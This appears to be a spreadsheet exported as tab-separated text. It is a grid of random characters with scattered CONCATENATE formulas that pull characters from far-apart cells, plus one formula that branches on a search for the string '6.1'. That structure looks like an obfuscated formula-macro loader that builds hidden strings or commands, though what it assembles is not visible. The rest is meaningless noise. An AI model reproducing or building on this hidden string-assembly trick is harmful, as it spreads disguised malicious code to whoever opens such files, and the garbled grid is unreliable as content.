Z	4	I	a	R	&	:	r	C	y	`	j	y	I	g	-	|	<	I	\	Y	R	R	/	#	w
3	Y	"	{	y	 	C	+	T	k	C	P	q	8	:	b	%	%	N	?	u	j	>	e	$	B
"	1	U	+	A	g	.	U	P	^	E	I	3	:	J	i	Z	*	]	U	%	A	\	x	X	Z
P	v	q	$	b	k	'	0	T	p	D	,	{	z	<	;	v	c	z	@	8	Z	d	6	S	2
d	*	Q	_	v	7	*	X	p	:	P	 	J	Y	c	K	+	W	D	&	R	3	b	:	'	`
C	b	9	^	:	U	W	w	1	t	D	K	n	L	>	+	v	p	s	<	#	.	U	5	j	!
o	E	?	o	b	Y	]	R	V	C	Z	O	h	p	.	`	F	"	t	Z	X	k	.	?	 	7
r	@	<	g	z	z	'	|	)	:	]	1	L	i	A	h	f	n	y	+	u	M	[	'	]	i
?	g	;	P	u	#	-	8	T	H	p	>	`	u	`	A	i	'	e	"	j	a	]	U	=	&
E	(	(	+	;	o	C	w	g	7	A	w	9	.	K	$	3	H	J	v	p	l	1	m	f	d
n	[	\	R	;	+	a	F	}	2	b	4	`	N	~	&	9	C	=	`	:	"	y	~	B	&
w	"	X	_	C	8	J	|	=	_	>	0	%	^	?	Q	$	&	'	d	r	.	{	`	$	"
y	0	[	C	5	x	$	Q	M	<	_	q	$	.	Q	l	G	[	 	!	C	<	8	a	)	O
J	C	A	U	&	Q	f	@	=	~	3	+	$	^	Y	;	)	V	T	w	j	:	S	D	L	O
C	J	L	L	~	<	a	G	t	Q	&	?	C	v	$	L	-	"	%	_	V	%	u	r	 	F
%	C	i	`	`	S	^	M	#	*	(	q	z	-	R	|	`	2	C	g	N	s	D	/	c	^
T	z	i	<	u	'	J	A	U	L	X	m	$	C	$	J	[	|	J	X	I	G	I	y	z	L
X	+	z	F	/	U	|	O	q	w	#	I	$	0	$	"	d	9	 	w	a	W	!	,	`	>
'	Q	^	/	G	Y	$	e	/	K	=	p	"	r	/	8	h	u	h	G	.	{	V	t	h	Q
0	0	p	V	4	C	F	I	1	`	a	N	U	Y	p	)	h	J	E	c	7	v	G	S	p	H
o	z	b	]	~	s	i	S	E	@	1	 	o	o	Y	`	'	D	H	B	F	3	p	E	L	.
S	]	{	~	%	G	J	~	,	b	k	b	a	?	m	H	E	5	F	z	o	=	2	}	t	a
X	C	}	i	"	P	*	M	|	-	/	_	K	A	>	5	4	d	c	N	|	:	F	z	7	w
6	l	u	&	M	\	E	e	<	m	i	S	*	g	`	(	|	A	~	;	q	I	)	N	P	>
u	2	Z	j	i	P	W	|	B	U	g	P	F	*	;	1	A	=	]	?	j	s	7	e	*	!
s	:	J	J	5	3	_	'	V	n	q	&	w	b	s	E	%	8	k	7	:	o	+	O	O	v
9	h	H	i	Y	3	,	>	K	N	_	i	J	+	[	$	P	d	.	*	W	@	X	=	y	M
R	G	!	?	8	\	'	s	^	*	u	Y	6	4	}	B	m	v	j	s	q	:	v	_	x	Z
9	h	k	\	q	|	x	Y	C	R	A	`	T	*	V	G	M	.	n	3	G	$	u	l	&	V
T	o	A	}	(	-	P	'	x	~	_	@	t	T	|	?	]	#	e	f	K	$	R	`	`	y
q	k	o	y	h	y	'	h	"	'	5	4	A	l	N	k	X	x	|	1	[	{	I	L	r	<
E	z	i	=CONCATENATE(E1164,U1191,V1285,N11,E94)	7	T	z	F	z	'	j	y	@	^	_	)	{	4	c	x	6	v	}	4	t	-
y	*	?	%	,	D	3	c	k	5	f	>	,	,	d	H	s	1	.	/	x	a	A	Z	6	<
l	X	m	m	P	Z	t	m	)	a	v	s	C	y	z	*	k	x	<	Q	3	`	}	c	.	I
M	S	A	}	o	x	N	p	O	]	:	1	k	/	5	*	R	6	x	~	{	F	c	C	E	;
X	r	t	B	x	,	:	k	S	v	^	x	7	U	(	~	B	9	;	n	`	X	&	O	 	{
^	f	:	2	]	)	^	y	$	z	q	V	H	Z	a	/	g	;	^	G	0	L	_	.	G	S
H	.	;	d	z	;	D	@	A	S	T	A	f	+	c	"	3	}	(	6	=	:	D	X	-	e
a	;	W	J	V	p	j	2	,	h	c	(	A	4	x	D	;	h	H	w	5	y	^	5	c	%
y	~	M	*	6	!	$	+	U	f	f	Y	f	B	m	Z	!	*	_	~	f	&	-	s	s	;
=	Y	<	5	!	D	j	3	f	<	;	x	l	S	]	f	7	&	:	^	Y	"	\	n	A	C
z	$	+	%	}	c	y	S	(	:	[	N	R	{	+	%	Y	9	,	E	}	B	+	G	p	:
E	b	I	$	w	,	w	i	B	U	{	"	e	3	r	L	0	V	N	|	3	W	b	e	I	<
L	"	o	W	 	h	V	"	J	K	k	F	X	'	8	s	~	R	%	d	1	O	=	2	[	Z
Z	y	G	A	Y	>	h	g	h	3	=	v	K	x	u	w	)	2	E	z	~	V	{	K	5	E
)	P	 	X	p	b	`	h	2	A	0	@	z	M	v	.	I	L	5	w	*	o	K	p	?	k
T	.	E	r	F	:	/	P	+	'	1	)	u	&	e	4	c	?	L	/	V	K	8	k	m	N
F	o	{	/	Y	w	a	u	j	M	C	u	B	.	=	o	V	=CONCATENATE(J1273,U385,T673,R75,H865)	Y	9	U	T	\	v	~	F
J	i	0	,	6	&	Y	Q	7	@	1	,	e	m	0	%	Q	j	:	G	A	G	6	W	w	D
5	F	$	?	/	N	4	Z	r	8	x	m	O	h	r	#	+	x	D	4	v	(	<	Y	]	H
x	u	W	G	m	!	y	p	o	J	9	*	m	m	F	x	@	k	>	#	Y	W	o	?	_	o
;	t	_	|	$	?	>	"	P	(	E	!	w	U	,	%	D	x	j	_	V	!	W	]	U	n
>	>	w	I	W	i	<	H	%	D	Z	 	g	3	i	M	*	&	{	,	o	U	2	R	P	,
-	;	:	C	_	~	{	M	?	0	&	n	>	|	g	-	s	9	k	c	e	B	$	B	=	!
L	P	t	k	H	\	h	m	&	N	_	y	=	5	3	o	J	0	Q	z	E	{	[	+	b	r
M	0	5	T	{	x	G	E	F	3	D	C	y	S	0	<	v	 	U	[	K	A	g	2	N	U
^	 	C	>	I	=	i	/	/	w	)	x	t	T	6	7	@	w	h	)	i	G	D	<	"	h
y	5	A	y	<	<	`	e	y	Z	i	B	3	I	?	r	2	s	A	q	W	#	~	_	 	:
$	#	I	}	k	7	Y	N	3	\	$	j	V	]	f	S	o	~	6	y	 	9	<	,	A	8
z	]	C	|	/	h	G	y	~	4	9	_	o	Y	u	F	>	=	a	H	-	r	S	O	E	N
]	m	o	'	9	)	L	z	(	o	z	H	&	X	#	8	[	H	(	[	o	g	I	n	{	q
L	|	X	N	i	6	Y	T	k	@	4	N	V	N	?	Q	W	O	f	,	c	,	@	?	m	*
U	w	+	"	)	q	"	"	s	4	J	f	X	C	Y	.	,	6	K	)	X	2	u	(	G	o
$	'	B	2	e	q	"	s	E	&	_	U	q	7	;	L	[	`	}	M	S	,	}	l	t	g
Q	@	]	.	w	X	f	{	z	J	w	#	+	b	n	Q	n	0	<	O	.	e	F	p	<	g
_	n	Y	?	7	y	'	N	a	3	S	s	@	{	e	~	{	o	2	e	e	"	{	7	x	"
1	L	z	r	=	l	=	R	F	=	t	k	r	f	n	,	/	\	A	@	f	1	[	G	F	G
H	=	y	}	R	;	j	8	6	8	l	D	V	S	d	i	#	P	.	W	3	:	V	6	F	C
*	a	!	Q	M	7	n	F	B	{	p	a	K	d	U	x	"	5	v	<	;	G	D	Y	g	|
W	7	j	N	3	}	:	>	6	[	l	t	K	_	I	7	a	[	L	H	:	D	G	@	r	/
0	z	`	'	g	T	V	[	Z	#	0	&	|	V	r	>	|	U	_	Y	~	2	.	T	v	Z
?	N	k	_	I	,	v	e	-	S	8	 	 	j	\	Y	_	M	_	u	$	n	o	5	Q	c
H	)	_	_	K	q	}	J	f	w	(	E	q	O	-	\	(	R	g	k	G	O	e	S	,	K
,	d	h	X	M	/	d	-	{	6	f	&	<	I	H	e	C	e	T	k	T	<	!	^	)	k
o	7	C	s	W	$	Q	j	j	r	M	8	t	N	v	x	5	/	l	x	C	=	i	)	e	L
#	N	[	i	^	H	8	=	E	H	f	S	/	H	V	`	1	X	3	!	`	5	w	%	y	8
$	}	1	S	*	5	&	y	Y	-	|	n	 	=	E	K	S	*	k	I	w	<	e	S	f	S
i	H	a	X	u	e	)	8	G	t	v	O	 	 	j	v	D	j	J	X	s	|	@	5	o	T
A	-	@	6	s	N	j	(	>	@	K	[	\	R	}	e	%	6	Z	V	t	#	;	G	/	l
v	]	e	L	9	"	+	h	Z	|	f	x	A	R	O	U	|	J	"	+	A	=	a	R	a	m
)	?	A	q	:	o	w	\	)	b	m	Y	*	7	*	m	e	[	M	%	|	V	*	6	-	)
V	\	Y	)	A	0	u	Y	p	L	l	}	$	m	g	M	A	E	 	*	B	U	4	K	>	.
r	V	f	~	b	<	c	$	o	^	*	X	q	3	?	)	)	@	g	e	E	o	x	A	_	3
s	G	o	-	t	s	h	G	'	7	/	'	?	V	W	P	Z	W	J	k	~	M	X	6	K	7
j	3	7	V	(	c	]	a	j	*	C	#	6	-	D	D	 	4	d	~	x	\	{	g	?	 
y	G	O	8	)	2	B	'	g	Q	d	(	^	<	r	|	J	/	G	:	*	e	%	 	M	)
?	=	C	Q	?	"	r	!	p	}	q	K	3	*	q	s	0	~	6	]	m	t	L	1	P	A
F	"	%	m	_	U	y	G	,	t	'	t	,	x	:	h	=	e	J	V	}	@	/	=	?	t
+	L	Y	n	*	 	P	8	T	y	o	]	`	i	F	y	%	;	R	l	S	m	 	4	M	I
.	=	R	L	$	`	@	x	2	(	s	r	P	!	9	%	y	~	j	q	\	`	=	J	u	;
c	L	8	N	H	q	[	P	a	0	E	&	x	d	4	Y	(	$	b	.	z	w	7	G	Y	)
"	k	@	>	!	#	!	*	T	t	D	s	l	{	p	@	>	[	/	6	t	c	l	y	%	+
6	,	G	r	A	X	 	,	T	U	,	q	]	O	z	|	v	7	y	,	.	A	}	9	?	#
i	K	5	]	!	5	g	4	F	t	#	7	v	]	2	>	E	D	%	/	x	?	D	q	m	)
:	;	o	/	G	A	~	%	g	Q	o	.	~	|	L	O	%	I	d	`	%	k	P	b	I	y
Q	u	3	|	8	6	Z	;	Z	C	Y	`	B	q	F	?	 	W	}	y	 	-	k	m	v	"
3	Q	"	1	<	D	@	_	6	5	W	l	D	F	3	r	(	+	|	h	'	]	:	#	u	b
i	C	!	Q	G	_	)	*	2	4	8	^	2	o	u	0	)	T	x	4	`	{	Z	&	!	;
e	+	'	W	u	'	R	J	B	(	F	'	w	W	w	k	c	l	7	M	@	(	{	{	u	~
L	W	m	J	o	x	(	;	h	a	w	-	Q	R	6	(	D	J	3	4	n	?	V	m	q	L
h	W	Q	z	Y	R	=	$	O	h	%	H	l	{	[	t	o	i	&	"	O	_	6	:	N	A
3	l	p	0	X	"	;	W	k	f	\	y	1	z	a	Z	\	^	[	2	b	3	k	W	B	J
3	`	-	3	u	)	u	b	K	i	u	+	2	q	v	5	T	L	^	'	&	)	`	\	I	#
H	h	|	"	4	C	;	3	A	'	j	#	u	M	m	P	F	H	*	2	7	f	/	#	+	L
x	`	"	U	r	7	H	K	H	W	/	(	Q	e	e	b	D	Z	G	f	t	w	(	5	X	^
u	.	u	P	J	X	(	r	_	>	w	I	%	L	B	j	T	Y	.	3	-	)	U	S	9	o
I	e	'	p	R	}	o	\	,	{	S	 	_	}	~	M	k	U	v	r	b	_	^	l	v	8
j	v	S	=	>	p	E	?	(	k	H	&	c	A	J	I	n	'	h	6	x	B	1	l	@	f
9	6	m	7	N	C	G	2	W	v	~	,	S	~	b	l	k	!	&	m	P	m	m	2	D	4
D	e	5	R	!	f	l	@	b	V	l	-	i	V	:	M	V	I	u	y	"	D	|	,	U	I
\	N	=CONCATENATE(B358,Q771,K834,K924,D1020,M1175,F94)	\	h	k	f	B	|	7	O	r	N	C	'	G	m	"	x	-	$	U	E	4	S	I
p	f	v	)	c	y	M	g	C	$	{	1	G	t	D	H	b	g	g	n	b	q	%	|	5	m
I	U	$	;	i	>	6	`	^	5	~	c	o	G	b	#	]	~	8	N	3	d	X	g	\	t
w	(	Q	.	W	c	p	)	f	e	@	*	8	 	>	k	b	?	X	D	a	N	S	T	I	4
=	9	G	*	8	r	l	W	I	0	`	@	_	v	o	6	N	Z	w	F	X	8	.	V	)	w
K	_	h	L	p	?	%	?	S	!	e	_	E	:	!	$	m	|	1	#	(	v	_	m	(	l
}	M	\	[	o	4	Z	9	g	n	]	/	H	r	`	f	+	p	~	p	2	z	.	n	<	;
'	!	*	L	:	b	L	m	6	w	`	S	)	a	y	J	o	i	'	A	s	n	(	7	b	s
V	C	J	!	e	.	0	2	$	\	|	=	D	~	G	M	S	>	,	e	x	?	o	0	2	%
/	V	`	8	m	|	x	7	l	)	m	(	r	_	k	$	3	C	P	{	/	1	A	=	4	.
[	n	-	*	T	*	G	L	]	_	6	_	]	i	t	O	*	H	l	^	2	5	V	/	:	t
m	g	B	)	6	o	I	y	B	6	b	^	U	(	0	W	K	Q	t	Y	i	o	Y	`	|	(
!	a	i	G	Z	N	;	E	x	y	G	X	V	w	C	o	}	O	4	{	*	&	a	4	L	G
#	:	f	^	5	D	!	|	/	k	0	M	i	\	v	Q	@	h	\	Q	k	W	4	i	<	h
<	u	<	?	g	A	|	H	b	:	6	*	$	l	S	(	f	L	e	^	;	y	\	2	i	]
]	+	b	|	C	g	c	}	T	!	^	T	&	_	E	E	C	_	$	G	]	s	n	}	H	U
8	M	x	V	`	h	=	>	l	v	}	V	_	I	@	H	,	1	J	^	H	S	*	E	C	B
n	-	c	U	:	@	]	C	s	Q	A	X	9	U	R	,	<	i	e	&	 	i	!	w	k	2
^	o	j	1	&	Y	z	,	R	H	U	E	 	~	@	o	$	Y	4	,	V	t	#	/	*	t
f	:	j	=	U	2	 	s	w	\	?	?	@	d	!	i	T	D	]	z	f	3	&	}	J	x
J	]	]	K	#	_	n	^	3	0	`	.	h	e	Q	u	|	y	9	O	z	s	q	D	=	m
A	u	4	v	*	H	}	#	r	y	<	h	O	|	i	O	M	C	G	N	I	G	)	@	u	E
B	a	e	B	I	u	d	K	v	x	]	l	{	y	f	#	|	7	*	H	h	4	T	)	L	{
f	\	(	=	*	o	>	[	(	1	2	*	@	e	j	'	C	p	`	X	%	J	?	%	s	7
U	5	n	@	 	%	7	X	G	7	J	:	a	[	9	%	O	.	e	d	h	N	$	u	@	[
;	j	Q	l	6	S	s	G	n	^	`	C	G	f	'	N	Q	\	W	;	N	D	:	T	U	G
L	#	|	D	r	<	|	m	u	^	T	T	i	!	.	]	s	#	u	'	p	N	R	:	H	Z
i	S	:	T	5	8	_	7	N	=	/	p	1	y	h	r	8	B	r	I	M	(	o	N	"	 
-	c	E	}	*	7	8	H	!	6	i	j	x	9	k	j	8	i	<	|	d	c	.	.	H	&
b	x	V	-	-	C	T	G	+	*	^	|	$	E	9	8	7	4	V	V	|	v	U	1	[	z
!	[	k	F	5	#	e	I	N	Z	K	s	#	H	4	W	~	,	t	=	~	6	m	,	d	+
2	:	X	{	a	N	W	O	Y	Y	P	(	)	N	9	=	E	&	U	a	W	)	`	*	v	C
G	4	L	5	3	)	:	]	b	w	h	Q	R	'	x	|	"	9	&	d	&	p	y	m	0	v
n	t	f	C	a	?	9	;	-	0	_	s	!	y	h	Q	y	V	C	7	j	p	o	:	D	o
c	 	s	T	b	(	Q	<	j	'	0	r	M	Y	b	7	:	5	u	~	"	T	p	m	_	/
3	.	G	q	 	+	t	C	e	c	t	O	)	5	S	}	9	[	Q	F	1	m	 	N	r	6
#	m	`	e	t	N	l	D	r	|	C	0	.	B	n	p	G	y	$	T	2	@	7	\	i	%
v	Q	\	J	{	]	X	-	o	w	R	/	9	h	b	Z	]	e	&	4	Y	8	S	x	?	y
#	=	4	p	'	x	B	m	I	=	O	_	-	w	 	%	e	?	'	h	*	+	f	d	s	{
 	:	_	<	h	t	4	x	o	9	N	:	;	 	$	n	A	@	c	|	p	I	%	d	i	_
l	v	5	V	%	e	-	,	{	W	G	;	i	'	=	_	6	2	"	=	f	0	4	j	y	H
2	.	 	i	@	^	0	A	6	^	C	V	h	r	;	_	U	/	J	?	m	'	m	x	|	f
4	N	m	-	:	=	5	k	T	h	]	|	]	-	-	n	J	M	^	O	6	u	]	-	V	"
Q	^	@	h	k	3	R	t	p	Z	;	a	E	f	~	x	S	~	(	#	'	~	c	~	w	T
q	[	E	8	L	8	v	M	_	7	A	F	b	Y	9	Y	m	i	`	K	>	k	C	>	2	]
>	n	{	u	}	~	n	k	y	6	h	;	X	9	Y	d	-	z	K	n	u	:	U	^	r	"
u	5	Z	=CONCATENATE(X1224,P1281,U1293,G11,Q801)	r	1	;	g	|	x	I	u	1	D	i	f	f	4	a	-	L	(	;	1	>	H
H	;	%	p	l	(	,	Q	i	V	N	^	`	M	i	\	=CONCATENATE(U410)	e	u	0	E	*	<	-	d	<
/	$	j	+	^	-	$	?	n	n	C	H	X	6	m	I	$	[	3	q	o	`	b	^	x	$
m	c	b	0	2	C	K	&	y	#	n	i	R	,	[	{	c	x	O	!	:	&	E	>	K	/
\	&	e	|	m	m	_	?	K	<	<	n	T	_	l	*	;	/	^	J	+	w	s	v	<	G
6	^	T	H	"	!	}	4	o	i	S	6	9	Y	@	v	\	{	`	a	/	7	z	n	X	k
$	k	#	>	_	T	F	6	t	"	v	L	I	o	a	w	 	P	?	q	#	W	A	D	,	i
w	m	%	:	U	@	L	9	)	p	3	y	f	'	W	;	H	m	g	>	h	J	"	d	w	&
b	'	t	!	2	~	D	S	,	Q	Y	X	{	'	u	)	0	C	>	d	/	H	2	>	B	r
{	M	&	G	s	C	w	}	L	 	a	f	2	x	p	z	j	9	4	S	h	}	w	^	O	H
0	.	L	x	;	B	,	e	\	(	f	{	,	f	H	C	~	N	J	R	^	@	?	i	l	@
7	{	H	n	*	U	!	Q	P	w	v	6	,	1	d	e	&	H	l	t	V	@	<	X	2	6
C	v	/	7	L	:	g	v	m	+	=	(	\	_	Y	u	$	M	u	H	G	T	3	#	J	{
g	y	l	L	#	.	B	v	c	a	*	9	3	L	I	0	k	]	X	'	%	%	m	t	,	\
&	4	W	M	Z	H	J	w	D	*	'	k	^	r	~	a	r	y	T	X	T	Z	\	-	A	*
=	t	G	9	X	{	D	|	L	*	9	H	7	:	g	l	A	x	m	`	2	c	/	f	3	5
Q	.	]	D	2	Y	#	{	X	M	f	r	F	_	N	D	p	%	5	H	o	M	|	J	T	u
G	r	?	b	x	d	Z	0	q	|	7	#	w	2	0	`	%	H	f	S	P	y	t	H	t	6
t	F	L	B	?	F	A	?	;	Q	)	x	<	f	c	i	A	v	K	|	D	m	#	h	a	|
D	d	$	;	o	x	X	)	T	_	:	D	n	m	o	T	N	)	*	_	v	k	c	]	X	$
f	z	9	f	-	!	e	_	Z	b	V	2	p	R	K	P	h	G	P	*	3	V	d	=	"	f
?	p	t	I	o	F	W	>	D	5	E	7	i	>	?	]	,	|	)	2	/	A	Y	=	u	u
)	\	x	R	s	u	P	j	R	F	(	L	5	N	#	i	'	9	d	)	2	Y	:	h	c	6
%	K	r	&	5	v	a	B	|	Q	#	^	~	6	Z	/	{	'	l	o	s	U	!	Q	x	9
g	$	E	=IF(ISNUMBER(SEARCH("6.1",N546)),CONCATENATE(Z699,L932,J1190,C574,J644,A718,E813),CONCATENATE(A699,E932,K1190,J574,A644,Z718,W813))	C	h	%	G	H	u	i	8	4	o	c	"	y	o	P	@	f	q	c	N	x	O
Z	,	o	=#NAME!()	g	;	(	s	k	f	T	k	u	b	r	i	0	Z	t	u	0	u	`	)	i	b
Z	5	P	3	'	y	L	*	g	G	%	:	'	;	E	?	%	k	P	i	|	O	F	S	'	m
}	5	I	P	&	g	x	l	'	{	!	x	7	v	?	s	M	N	d	-	1	'	=CONCATENATE(B1334,B36,H461,G1019,U1036)	.	f	V
/	3	C	L	4	I	y	_	1	(	t	J	2	q	r	t	_	`	'	@	u	:	D	U	_	F
C	~	p	N	0	B	w	Q	|	!	p	d	g	m	l	b	e	p	9	3	P	c	w	q	#	E
7	C	<	'	z	%	f	~	W	r	%	]	,	;	k	^	|	x	y	n	'	5	/	,	|	2
>	:	*	0	l	!	-	f	~	W	k	%	4	d	^	1	X	G	"	X	I	2	R	q	Y	9
W	`	W	e	d	*	l	J	f	\	%	t	T	e	;	B	5	&	\	8	i	p	4	'	w	 
 	T	(	2	A	9	 	\	X	v	E	#	m	"	K	I	O	}	=CONCATENATE(M15,T86,S187,V106,R58,P1318,C194,M440)	%	j	K	N	A	i	u
A	{	E	X	n	]	]	/	)	&	U	6	6	j	R	n	V	r	a	]	w	S	d	]	9	g
K	3	j	]	~	l	4	j	P	E	,	L	1	#	n	e	6	;	F	J	%	n	9	N	)	"
b	4	&	`	d	 	6	0	p	2	4	B	;	2	-	7	5	7	4	.	,	M	-	{	7	!
i	b	n	(	c	W	q	I	E	 	h	E	M	Q	~	_	{	c	u	:	A	U	@	F	L	k
W	+	U	S	(	}	`	y	[	p	|	u	b	~	o	Y	&	t	u	J	"	_	h	E	/	0
3	a	%	H	>	v	_	L	G	6	3	_	z	X	s	:	{	b	4	@	]	w	,	Z	v	b
o	7	&	J	T	B	-	o	6	5	^	h	n	b	8	>	n	l	u	p	\	%	{	$	5	s
5	'	=CONCATENATE(F1213,I1285,O347,X742)	c	U	d	B	P	I	8	g	E	p	n	R	F	x	P	P	b	X	s	m	"	D	&
I	6	_	s	|	5	G	+	\	?	\	V	Y	@	K	!	Q	v	4	'	L	a	B	,	T	3
8	i	g	V	D	T	B	s	#	a	F	!	>	y	3	t	B	M	d	O	4	U	_	z	:	Y
1	M	!	c	5	~	-	D	>	,	>	Q	M	2	n	1	t	|	a	;	`	}	{	b	@	c
D	G	7	e	S	\	k	b	j	Q	7	q	8	9	I	i	e	!	=	n	W	=	)	P	?	_
D	2	>	6	/	Z	'	c	Z	}	F	Q	y	R	7	!	;	>	{	'	x	B	p	]	%	;
t	A	;	F	8	0	 	1	n	~	a	Q	f	$	`	q	d	U	f	U	|	\	+	o	O	P
G	s	S	9	F	[	3	3	e	4	g	-	[	I	!	=CONCATENATE(H730,C801,K802,S1032,C297,B358)	P	G	K	0	]	4	1	w	y	9
3	t	m	z	A	l	R	E	&	x	G	U	/	+	A	z	C	b	u	1	O	2	l	5	`	s
e	"	Y	6	-	(	(	&	l	O	m	C	c	/	~	=	x	v	2	J	=	d	B	&	J	/
$	|	d	_	~	4	A	V	$	k	\	F	M	-	"	T	|	H	d	0	S	A	e	a	_	[
Q	W	1	e	_	s	b	$	u	o	,	$	6	b	y	K	K	m	|	V	"	(	}	;	M	&
3	}	w	d	=	D	O	Y	W	{	9	I	Z	l	~	g	f	v	/	_	X	/	}	.	c	`
f	*	(	~	Z	y	>	|	*	9	D	)	+	&	*	{	V	D	w	5	\	/	|	<	a	D
e	c	*	3	:	m	I	%	J	$	/	!	#	~	%	2	m	f	,	n	 	d	.	7	_	d
=	;	v	7	j	n	1	\	'	n	l	v	f	^	&	"	M	X	4	b	<	8	4	/	O	W
!	.	>	@	$	1	X	p	7	U	k	u	L	u	n	q	m	p	 	X	3	T	m	K	e	_
/	h	:	N	r	k	]	&	D	M	U	g	>	<	C	U	|	}	E	G	r	c	Z	:	o	M
;	a	V	8	r	F	"	[	I	(	w	U	?	h	v	|	R	4	,	V	s	%	F	r	Q	}
O	j	Q	K	g	j	i	z	2	,	G	:	N	t	a	r	/	a	(	P	W	Y	#	|	W	"
.	'	Y	@	+	:	n	y	z	G	V	W	]	H	O	M	K	F	Y	G	0	`	\	5	J	C
E	C	w	5	q	D	T	j	o	5	r	f	S	.	@	t	e	z	B	y	T	0	|	)	;	7
^	S	d	-	F	h	#	w	D	l	4	X	s	h	Q	%	N	/	q	h	m	]	,	x	u	d
3	n	k	g	}	>	f	p	F	2	a	P	i	6	~	W	 	5	P	R	I	{	s	#	/	k
G	/	b	J	@	y	\	?	O	r	z	9	9	]	%	r	R	y	>	y	e	`	}	X	R	*
}	6	7	9	K	@	&	$	M	t	Q	4	|	z	j	"	A	$	6	^	s	@	3	v	v	D
F	4	w	|	Y	F	G	G	]	k	y	d	9	y	X	[	!	|	c	;	 	-	5	G	F	q
`	\	=	x	%	3	4	1	w	s	K	F	t	j	v	e	|	a	J	b	;	V	T	C	z	}
L	:	*	,	@	b	F	w	Z	T	^	#	L	D	k	~	0	p	&	W	?	_	Y	{	7	/
m	{	0	g	B	f	[	t	Z	<	3	8	9	^	c	i	@	W	]	A	]	c	_	e	h	s
{	a	{	_	'	;	4	b	O	5	#	H	|	*	p	w	o	&	/	&	T	:	-	+	j	M
E	(	?	5	1	Y	G	k	I	n	$	>	M	Q	k	9	f	B	\	}	j	?	C	>	U	W
w	@	T	V	t	F	a	;	W	I	'	L	x	g	S	'	L	i	:	q	<	Q	>	O	c	s
A	-	z	1	7	\	N	b	n	c	a	x	I	S	B	b	\	N	y	h	P	{	&	h	:	`
v	$	~	k	0	j	p	E	d	?	M	"	1	1	Y	"	a	3	h	0	;	e	C	-	w	1
]	x	~	U	X	3	&	\	P	|	u	f	8	}	]	7	i	'	0	a	a	k	b	,	_	;
H	f	C	@	b	A	r	[	|	b	B	'	s	M	-	q	T	R	r	'	p	*	h	-	a	+
9	>	m	L	G	4	,	[	>	m	{	K	_	5	_	5	6	B	L	v	(	y	(	d	k	Q
"	E	F	O	{	9	o	E	@	+	v	\	I	W	R	o	e	$	T	9	H	w	n	(	'	%
{	J	(	O	O	-	m	o	T	h	(	~	c	T	o	<	8	G	\	3	g	Y	K	m	i	E
8	8	-	h	w	w	`	:	8	X	0	C	b	|	;	&	{	(	~	_	n	S	R	h	V	~
Q	f	O	G	C	y	8	j	.	9	[	H	~	a	;	$	U	.	"	p	A	p	P	O	_	X
(	h	*	Q	=	r	W	j	M	]	y	W	/	b	o	x	a	%	#	g	@	M	a	<	]	0
x	7	y	z	m	{	U	)	f	g	J	@	S	=	D	{	 	d	z	U	l	;	G	R	|	 
I	7	.	I	0	;	U	D	$	.	H	C	E	|	d	o	Q	H	<	e	X	/	^	f	l	F
7	m	G	9	a	2	}	z	9	s	=CONCATENATE(G335,Q471,W570,F615,O686,V719)	F	x	y	$	X	x	8	[	O	s	=	)	u	1	?
E	y	j	N	1	%	%	X	W	0	7	B	e	N	%	}	-	3	i	,	7	J	_	/	(	I
n	4	i	<	B	>	z	]	U	]	a	n	y	h	f	p	4	W	y	B	 	@	)	G	=CONCATENATE(T645,M750,N1097,V551,Z960,B994)	_
?	'	{	A	G	$	E	j	v	4	[	{	V	8	H	}	.	t	y	b	q	%	,	A	T	U
1	z	z	G	h	*	3	Y	2	W	<	/	\	?	1	|	'	1	"	c	.	B	_	)	$	S
7	U	v	d	b	5	K	g	L	H	-	w	N	n	p	z	@	H	{	g	V	U	 	E	x	T
"	r	R	G	X	B	2	K	e	,	D	r	G	4	%	`	t	p	{	`	!	e	,	u	k	]
"	q	n	<	p	z	2	!	?	2	_	:	/	8	W	0	Y	W	3	f	2	M	m	5	k	S
#	>	j	~	u	L	t	|	i	q	G	&	I	T	s	M	V	 	C	_	$	|	b	6	}	 
.	v	C	G	M	k	;	|	X	D	9	V	Z	F	/	@	}	A	-	.	;	&	n	i	p	p
i	D	<	t	5	>	q	v	-	S	D	'	k	?	_	,	M	p	t	w	}	K	=	S	/	h
)	,	C	!	h	_	@	q	d	`	4	 	*	m	D	B	b	R	!	m	!	k	Y	x	[	!
k	E	#	P	Y	b	X	b	g	J	p	i	q	b	3	V	M	r	a	f	a	A	o	K	e	R
'	1	B	"	u	V	.	<	^	=	,	*	r	c	0	3	u	V	(	V	x	i	|	6	&	[
v	Z	1	}	P	}	4	%	i	\	f	?	]	"	.	!	m	h	$	=	:	6	6	3	0	i
4	{	B	(	`	G	l	?	x	W	2	X	I	F	V	'	B	@	}	.	,	(	p	7	*	Z
5	W	P	-	F	r	%	K	$	 	0	a	_	?	M	Q	X	f	e	0	O	/	R	6	H	N
H	F	X	S	%	&	=	=	-	%	Z	P	=	M	%	3	X	I	q	4	O	J	B	n	-	E
>	r	W	(	8	t	e	l	L	6	-	t	R	P	}	D	?	r	-	<	x	~	`	o	P	s
_	Y	3	w	\	D	7	4	O	%	c	w	n	\	%	7	U	f	A	5	b	w	L	d	t	"
t	$	e	W	R	/	)	}	=	O	l	a	}	g	G	Q	1	)	;	c	L	)	#	{	M	K
D	g	T	W	U	I	z	Y	K	&	+	u	A	1	4	u	M	|	B	z	(	t	B	1	a	9
q	2	c	9	9	g	n	+	~	5	z	B	|	|	_	)	e	O	'	>	:	A	8	x	%	I
,	%	M	<	x	N	U	r	@	&	6	B	F	]	e	-	%	>	c	u	Q	l	z	T	8	y
O	)	'	K	>	]	<	|	h	U	j	(	/	<	Y	,	R	m	c	F	W	n	~	*	C	8
O	}	T	Z	0	R	Q	6	f	K	)	R	L	(	C	L	7	#	x	R	H	c	M	p	i	5
w	0	j	b	3	)	s	o	K	;	*	)	^	D	:	^	$	 	.	U	2	)	m	.	 	 
l	_	+	u	V	_	%	7	"	$	K	1	f	6	v	O	l	?	U	0	Y	o	'	 	O	|
^	n	=	3	|	q	9	I	3	<	K	}	O	#	`	p	0	u	@	E	B	=	]	v	t	Q
%	-	_	6	[	=	\	T	@	)	f	!	6	z	0	4	%	5	=	/	;	-	\	p	M	1
k	G	F	c	u	\	 	A	e	x	x	e	8	N	T	8	.	^	T	N	n	K	L	!	X	n
`	3	0	"	r	3	0	L	4	{	1	P	A	!	<	V	D	^	)	)	(	,	|	n	#	b
2	D	G	,	]	)	x	&	t	Z	v	n	,	c	%	~	f	?	C	2	I	}	5	I	j	z
v	E	n	1	3	W	h	g	@	t	3	h	x	%	M	!	[	i	=	F	%	v	c	Y	i	?
I	=	R	P	Z	*	\	~	3	!	E	B	8	|	8	J	 	m	x	A	z	7	+	-	_	M
